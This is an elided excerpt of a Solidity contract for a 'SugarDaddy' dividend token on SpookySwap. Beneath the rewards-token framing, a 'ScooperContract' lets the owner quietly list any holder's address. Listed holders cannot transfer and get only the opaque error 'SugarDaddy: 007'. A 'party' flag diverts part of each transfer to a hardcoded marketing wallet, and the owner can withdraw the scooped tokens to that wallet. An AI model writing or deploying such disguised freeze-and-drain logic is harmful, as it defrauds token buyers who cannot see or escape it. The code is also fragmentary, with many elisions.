...
contract SugarDaddyBuyBack is Ownable {
    using SafeMath for uint256;
    ...
    constructor(){
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xF491e7B69E4244ad4002BC14e878a34207E38c29); //SPOOKY
...
contract ScooperContract is Ownable {
    ...
    address public marketingWallet = 0x65E52eE98413e6E9e2bB73ca767b7D8e2E6FdDDE; //MARKETING WALLET ALICE
...
contract SugarDaddy is ERC20, Ownable {
    using SafeMath for uint256;

    SugarDaddyRewardsTracker public rewardsTracker;
    
    SugarDaddyBuyBack public buyBackContract;
    
    ScooperContract public scooper;
    ...
    address payable public marketingWallet = 0x65E52eE98413e6E9e2bB73ca767b7D8e2E6FdDDE; //MARKETING WALLET ALICE
    ...
    constructor() ERC20("SugarDaddy", "SUGARDADDY") {
        totalFees = rewardsFee.add(liquidityFee);

    	liquidityWallet = owner();

        rewardsTracker = new SugarDaddyRewardsTracker();
        
        buyBackContract = new SugarDaddyBuyBack();
        
        scooper = new ScooperContract();

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xF491e7B69E4244ad4002BC14e878a34207E38c29); //SPOOKY
         // mainnet: 0xF491e7B69E4244ad4002BC14e878a34207E38c29, testnet: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        ...
        _approve(address(scooper), address(uniswapV2Router), uint256(-1));
    ...
    function buyBackChange(address newAddy) external onlyOwner {
  	...
  	function scooperAdd(address addy) public onlyOwner {
  	    scooper.adder(addy);
  	    rewardsTracker.excludeFromDividends(addy);
  	}
  	
  	function scooperSend(uint256 tokens) public onlyOwner {
  	    scooper.withdrawToMarketing(tokens);
  	}
    ...
    function _transfer(
        ...
        require(!scooper.statusFind(from), "SugarDaddy: 007");
        
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "SugarDaddy: This account cannot send tokens until trading is enabled");
        }
        ...
        if (party) {
            ...
            super._transfer(from, address(scooper), dogeNumber);
            try scooper.swapTokensForEthMarketing(balanceOf(address(scooper))) {} catch {}
        }

        super._transfer(from, to, amount);
        rewardsTracker.updateSugarDaddyBalance(payable(from), balanceOf(from));
        rewardsTracker.updateSugarDaddyBalance(payable(to), balanceOf(to));
...
/// @author Roger Wu (https://github.com/roger-wu) - forked specific functions for SugarDaddy Token
...
contract SugarDaddyRewardsTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    mapping (address => uint256) public SugarDaddyBalance;
    ...
    constructor() DividendPayingToken("SugarDaddyRewardsTracker", "SugarDaddyRewardsTracker") {
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "SugarDaddyRewardsTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "SugarDaddyRewardsTracker: Use the 'claim' function on the main SugarDaddy contract.");
    }
    ...
    function updateSugarDaddyBalance(address payable holder, uint256 shares) external onlyOwner {
        SugarDaddyBalance[holder] = shares;
    }
    ...
    function setBalance(address payable account) public onlyOwner {
    	...
    	uint256 newBalanceWithOffset = SugarDaddyBalance[account].add(offset[account]);
